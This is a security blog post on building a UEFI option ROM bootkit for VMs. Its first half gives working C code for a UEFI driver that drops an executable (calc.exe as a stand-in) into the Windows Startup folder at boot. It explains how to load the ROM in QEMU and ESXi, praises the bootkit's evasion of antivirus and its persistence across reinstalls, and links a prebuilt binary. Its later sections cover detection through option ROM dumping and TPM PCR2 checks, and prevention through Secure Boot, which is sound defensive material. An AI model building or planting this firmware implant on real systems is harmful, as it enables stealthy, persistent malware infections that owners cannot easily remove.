---
title: "UEFI Option ROM Bootkit"
date: 2022-09-26T00:00:00-00:00
draft: false
tags: [uefi, bootkit, option rom, bios]
categories: []
summary: ""
---
## UEFI Option ROM Bootkit


## Option ROMs

Option ROMs (OpRom) are programs that get loaded by UEFI/BIOS during boot which allow a hardware vendor to execute custom code to initialize a device, install a respective driver, etc. A popular example is [iPXE](https://ipxe.org/) which allows a NIC to PXE boot the host via an option ROM.

## Adding an Option ROM to VMs

#### QEMU/KVM

One easy way to add an OpRom to QEMU VMs is to use the e1000e NIC and pass in the OpRom as a parameter to the card

```bash
-device e1000e,romfile=myoptionrom.efirom
```


#### VMware ESXi

ESXi stores VM configuration data in .vmx files where an option can be added to load a custom ROM. The iPXE project has [some documentation](https://ipxe.org/howto/vmware) on doing this, but essentially you add a couple lines like this

```bash
ethernet0.opromsize = 262144
e1000bios.filename = "myoptionrom.efirom"
```


## Implementing a EXE dropper

Now that we know how to load an OpRom, let's write one to drop an executable on a Windows system that gets launched on boot.

#### UEFI Driver

Our OpRom driver must implement an entrypoint function (similar to main()). Here we will install our driver so the UEFI firmware can call our driver.

```c
EFI_DRIVER_BINDING_PROTOCOL gTestDriverBinding = {
    DriverSupported,        DriverStart, DriverStop,
    BOOTKIT_DRIVER_VERSION, NULL,        NULL};

EFI_STATUS EFIAPI OptionRomEntrypoint(IN EFI_HANDLE ImageHandle,
                    IN EFI_SYSTEM_TABLE *SystemTable) {
                        EFI_STATUS Status;

  // Setup global variables to use later
  gBS = SystemTable->BootServices;
  gST = SystemTable;
  gImageHandle = ImageHandle;

  Status = EfiLibInstallDriverBindingComponentName2(
      ImageHandle,         // ImageHandle
      SystemTable,         // SystemTable
      &gTestDriverBinding, // DriverBinding
      ImageHandle,         // DriverBindingHandle
      NULL, NULL);

  ASSERT_EFI_ERROR(Status);
  return Status;
}
```

Next, a couple more functions. DriverSupported() is called for each device the UEFI firmware enumerates and inside, we declare if our driver supports it. We will implement this to only support the e1000e NIC.

```c
EFI_STATUS EFIAPI DriverStop(IN EFI_DRIVER_BINDING_PROTOCOL *This,
           IN EFI_HANDLE Controller, IN UINTN NumberOfChildren, 
           IN EFI_HANDLE *ChildHandleBuffer) {
  // Don't need to anything here
  return EFI_SUCCESS;
}

EFI_STATUS EFIAPI DriverSupported(IN EFI_DRIVER_BINDING_PROTOCOL *This, 
                IN EFI_HANDLE Controller,
                IN EFI_DEVICE_PATH_PROTOCOL *RemainingDevicePath) {
  // Get EFI_DEVICE protocols
  EFI_DEVICE_PATH_PROTOCOL *this = DevicePathFromHandle(Controller);
  if (this == NULL) {
    return EFI_UNSUPPORTED;
  }

#ifdef OPROM_DEBUG
  // Print debug info with a UEFI string describing the device
  CHAR16 *p = ConvertDevicePathToText(this, TRUE, FALSE);
  Print(L"%s\n", p);
#endif

  // Only want our driver to work for the e1000e NIC
  if (Checke1000eNIC(Controller, &This)) {
    return EFI_SUCCESS;
  } else {
    return EFI_UNSUPPORTED;
  }
}
```

To check if we are being invoked for the e1000e NIC, we will do a PCI read of the header on the device and check the vendor/device IDs to see if they match.

```c
BOOLEAN Checke1000eNIC(EFI_HANDLE Controller,
                       EFI_DRIVER_BINDING_PROTOCOL **This) {
  EFI_STATUS Status = EFI_SUCCESS;
  EFI_PCI_IO_PROTOCOL *PciIo;

  // Open the PCIIo protocol on this PCI device handle
  PCI_TYPE00 Pci;
  Status = gBS->OpenProtocol(Controller, &gEfiPciIoProtocolGuid,
                             (VOID **)&PciIo, (*This)->DriverBindingHandle,
                             Controller, EFI_OPEN_PROTOCOL_BY_DRIVER);
  if (EFI_ERROR(Status) || PciIo == NULL) {
    return FALSE;
  }
  Status = PciIo->Pci.Read(PciIo,                       // (protocol, device)
                                                        // handle
                           EfiPciIoWidthUint32,         // access width & copy
                                                        // mode
                           0,                           // Offset
                           sizeof Pci / sizeof(UINT32), // Count
                           &Pci                         // target buffer
  );

  gBS->CloseProtocol(Controller, &gEfiPciIoProtocolGuid,
                     (*This)->DriverBindingHandle, Controller);

  if (Status == EFI_SUCCESS) {
#ifdef OPROM_DEBUG
    Print(L"PCI %X %X\n", Pci.Hdr.VendorId, Pci.Hdr.DeviceId);
#endif
    // e1000e Vendor & Device ID
    if (Pci.Hdr.VendorId == 0x8086 && Pci.Hdr.DeviceId == 0x10d3) {
      return TRUE;
    } else {
      return FALSE;
    }
  }
  return FALSE;
}

```

Finally, we will implement the DriverStart function which will be invoked once for the e1000e NIC once the device is discovered. Here we will dump "calc.exe" into the startup folder of the Windows install for a PoC.

To dump the file, we will rely on a NTFS driver to access the disk. UEFI has support built in to access FAT file systems so we need to load an [NTFS driver](https://github.com/gfoudree/UEFIBootkit/blob/main/ntfs_x64_rw.efi) which will allow the UEFI file APIs to work with NTFS.

First we try and open the EFISimpleFileSystemProtocol on all the devices (which should be present on a disk device). Next, we open the volume and a file inside the Windows startup folder and finally write our executable data to it.

```c
EFI_STATUS EFIAPI DriverStart(IN EFI_DRIVER_BINDING_PROTOCOL *This, 
            IN EFI_HANDLE Controller,
            IN EFI_DEVICE_PATH_PROTOCOL *RemainingDevicePath) {
  DumpCalcExe();
  return EFI_SUCCESS;
}


VOID DumpCalcExe() {
  EFI_STATUS Status = EFI_SUCCESS;
  UINTN i;
  EFI_HANDLE *HandleBuffer = NULL;
  UINTN HandleCount;

  // Get the SimpleFileSystem handles avail
  Status = gBS->LocateHandleBuffer(ByProtocol, &gEfiSimpleFileSystemProtocolGuid,
                              NULL, &HandleCount, &HandleBuffer);

  if (!EFI_ERROR(Status)) {
#ifdef OPROM_DEBUG
    Print(L"Status %d\n HandleCount %llx", Status, HandleCount);
#endif
    // Loop over all the disks
    EFI_FILE_PROTOCOL *Fs = NULL;
    for (i = 0; i < HandleCount; i++) {
      EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *SimpleFs = NULL;
      EFI_FILE_PROTOCOL *File = NULL;

      // Get protocol pointer for current volume
      Status = gBS->HandleProtocol(HandleBuffer[i],
                                   &gEfiSimpleFileSystemProtocolGuid,
                                   (VOID **)&SimpleFs);
      if (EFI_ERROR(Status)) {
#ifdef OPROM_DEBUG
        Print(L"FindWritableFs: gBS->HandleProtocol[%d] returned %r\n", i,
              Status);
#endif
        continue;
      }

      // Open the volume
      Status = SimpleFs->OpenVolume(SimpleFs, &Fs);
      if (EFI_ERROR(Status)) {
#ifdef OPROM_DEBUG
        Print(L"FindWritableFs: SimpleFs->OpenVolume[%d] returned %r\n", i,
              Status);
#endif
        continue;
      }

      // Try opening calc.exe file for writing
      Status = Fs->Open(
          Fs, &File,
          L"ProgramData\\Microsoft\\Windows\\Start "
          L"Menu\\Programs\\StartUp\\calc.exe",
          EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
      if (EFI_ERROR(Status)) {
#ifdef OPROM_DEBUG
        Print(L"FindWritableFs: Fs->Open[%d] returned %r\n", i, Status);
#endif
        continue;
      }

      UINTN bufSz = sizeof(calc_exe);
      Status = File->Write(File, &bufSz, calc_exe);

      if (EFI_ERROR(Status)) {
#ifdef OPROM_DEBUG
        Print(L"Error with file->write %r\n", Status);
#endif
      }
      File->Close(File);

      Status = EFI_SUCCESS;
    }
  }
}
```

## Impact

Since the bootkit hides inside of an option ROM of a PCI device, AV is not going to detect it let alone remove it. It will persist across reboots of the host as well as reinstallation, making for a great stealth persistance option. While this is a rather simplistic bootkit, much more can be done to  create a much more stealthy/persistant bootkit such as inserting SMM handlers from the UEFI firmware, etc.

Furthermore, rarely are .vmx files or KVM configurations audited for this sort of thing making it quite stealthy.

## Detection & Prevention

#### Dumping PCIe OpRoms

On Linux, you can enumerate PCI devices with the `lspci` command and get detailed information about each device, including if there is an OpRom attached. Below, you can see our `e1000e` device and it has an "Expansion ROM" of 256k.

```bash
└─$ lspci -vv
00:04.0 Ethernet controller: Intel Corporation 82574L Gigabit Network Connection
        Subsystem: Intel Corporation 82574L Gigabit Network Connection
        Physical Slot: 4
        Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx+
        Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx-
        Latency: 0
        Interrupt: pin A routed to IRQ 11
        Region 0: Memory at 81060000 (32-bit, non-prefetchable) [size=128K]
        Region 1: Memory at 81040000 (32-bit, non-prefetchable) [size=128K]
        Region 2: I/O ports at c040 [size=32]
        Region 3: Memory at 810a0000 (32-bit, non-prefetchable) [size=16K]
        Expansion ROM at 40040000 [disabled] [size=256K]
        Capabilities: <access denied>
        Kernel driver in use: e1000e
        Kernel modules: e1000e
```

We can then extract the OpRom by enabling the read and copying it out to a file.

```bash
cd /sys/devices/pci0000:00/0000:00:04.0
echo 1 | sudo tee rom
sudo dd if=rom of=/tmp/oprom.bin bs=1k count=256
echo 0 | sudo tee rom
```

```bash
└─$ file /tmp/oprom.bin 
/tmp/oprom.bin: BIOS (ia32) ROM Ext. (80*512)

└─$ md5sum /tmp/oprom.bin 
8f50555af37068823a7a404683b99585  /tmp/oprom.bin
```

And bingo, the hash matches the OpRom we are passing in to QEMU for the `e1000e` NIC.

From here, one can reverse engineer the ROM or simply alert that a new ROM has been introduced.

#### TPM PCR Registers

As part of the secure boot platform, the TPM contains [PCR registers](https://wiki.archlinux.org/title/Trusted_Platform_Module#Accessing_PCR_registers) which have hash values representative of the current system state including firmware. Modifying the underlying firmware will make these hash values change (and therefore possibly fail secure boot) so we can detect the insertion/modification of an OpRom via these hash values.

![TPM PCR registers](/tpm_pcr_registers.webp)

We can test this with QEMU by creating a vTPM for the VM (be sure OVMF is built with `-D TPM2_ENABLE -D SECURE_BOOT_ENABLE`)

```bash
swtpm socket --tpmstate dir=/tmp/emulated_tpm --ctrl \
        type=unixio,path=/tmp/emulated_tpm/swtpm-sock \
        --log level=20 --tpm2

qemu-system-x86_64 -bios ./Build/OvmfX64/DEBUG_GCC5/FV/OVMF.fd \
        -cdrom ~/Downloads/ISOs/kali-linux-2022.3-live-amd64.iso \
        -m 2048 -device e1000e,romfile=myoptionrom.efirom -smp 4 \
        -enable-kvm -chardev socket,id=chrtpm,path=/tmp/emulated_tpm/swtpm-sock \
        -tpmdev emulator,id=tpm0,chardev=chrtpm -device tpm-tis,tpmdev=tpm0

```

Inside the Linux VM, we can dump the TPM PCR registers and see that many of the registers look like they've been populated properly.

```bash
  sha1:
    0 : 0x529244E7253C7C861D84FFA330565E0734F1465D
    1 : 0x9780BAFB6A32CD879C32BE2F87C6D2ED3C452C0A
    2 : 0x8D92BD051EBFD76995EA610815A232A2FD00565D
    3 : 0xB2A83B0EBF2F8374299A5B2BDFC31EA955AD7236
    4 : 0xBC919BAC17CE4CAF7B0F2CAE295CBCAD05F97CC6
    5 : 0xD16D7E629FD8D08CA256F9AD3A3A1587C9E6CC1B
    6 : 0xB2A83B0EBF2F8374299A5B2BDFC31EA955AD7236
    7 : 0x518BD167271FBB64589C61E43D8C0165861431D8
    8 : 0x0000000000000000000000000000000000000000
    9 : 0x0000000000000000000000000000000000000000
    10: 0x1BD9CA5FEBE32A74668411BF4750CAD7DC7AE360
    11: 0x0000000000000000000000000000000000000000
    12: 0x0000000000000000000000000000000000000000
    13: 0x0000000000000000000000000000000000000000
    14: 0x0000000000000000000000000000000000000000
    15: 0x0000000000000000000000000000000000000000
    16: 0x0000000000000000000000000000000000000000
    17: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    18: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    19: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    20: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    21: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    22: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    23: 0x0000000000000000000000000000000000000000
```

Rebooting the VM with the same settings and dumping the PCR registers generates the *same* result. *However*, when we remove the OpRom (`-device e1000e,romfile=myoptionrom.efirom` -> `-device e1000e`), we can see PCR2 and PCR10 change!

```bash
└─$ diff boot1.txt boot3_rommodified.txt 
4c4
<     2 : 0x8D92BD051EBFD76995EA610815A232A2FD00565D
---
>     2 : 0xF27878B4A11FF2E55D48FEE86E96034E7F8B41AC
12c12
<     10: 0x1BD9CA5FEBE32A74668411BF4750CAD7DC7AE360
---
>     10: 0xDBBBD3234F8820C5D909C31F21FA5849ABC759AA
```

PCR2 corresponds to the "extended/pluggable executable code" which makes sense because we have modified this by removing the OpRom on the system. Therefore, by checking PCR2 for changes one can determine if a new (and potentially malicious) OpRom has been added including our bootkit.

#### Prevention

Secure boot will prevent unsigned option ROMs from being loaded and would disable this bootkit. However, very few VMs enable secure boot as it is complicated to do and is not common to have the security requirements to do so as it is not a physical machine. Secure boot is disabled by default on VirtualBox/ESXi/KVM.

## Code & Demo

### Code
[https://github.com/gfoudree/UEFIBootkit](https://github.com/gfoudree/UEFIBootkit)

### Building

You can download the built OpRom if you don't feel like building it: [https://github.com/gfoudree/UEFIBootkit/releases/download/0.0.1/bootkit_oprom.efirom](https://github.com/gfoudree/UEFIBootkit/releases/download/0.0.1/bootkit_oprom.efirom)

```bash
git clone https://github.com/gfoudree/UEFIBootkit
docker build . -t bootkit
```

Then copy the OptionRomBootkit.efirom file out from the image to get the bootkit OpRom.

### Running


```bash
qemu-system-x86_64 -bios ./Build/OvmfX64/DEBUG_GCC5/FV/OVMF.fd \
  -m 1024 -device e1000e,romfile=OptionRomBootkit.efirom \
  -enable-kvm -serial file:serial.log \
  -drive file=~/Downloads/win10.img -smp 2 -m 2048
```

### Demo
![calc.exe_launch](/calc_launch.webp)